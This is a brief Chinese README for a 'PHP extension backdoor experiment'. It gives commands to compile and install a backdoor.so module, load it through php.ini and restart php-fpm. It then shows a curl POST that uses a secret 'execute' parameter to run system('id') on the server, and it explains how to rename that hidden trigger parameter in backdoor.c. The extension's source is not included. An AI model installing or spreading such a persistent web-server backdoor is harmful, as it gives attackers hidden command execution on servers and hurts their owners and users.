# php扩展后门小实验

> 环境 Ubuntu 16.04, PHP 5.6

**编译**

```shell
# phpize && ./configure && make && sudo make install
```

修改配置文件 `php.ini`, 增加 `extension=backdoor.so`

重启PHP服务 `srevice php-fpm restart`

----

**测试**

```shell
# curl http://localhost/index.php --data "execute=system('id');"
uid=1002(www) gid=1002(www) groups=1002(www)
```

----

**自定义POST参数**

修改文件 `backdoor.c`

```c
char* secret_string = "execute";
# char* secret_string = "POST参数";
```
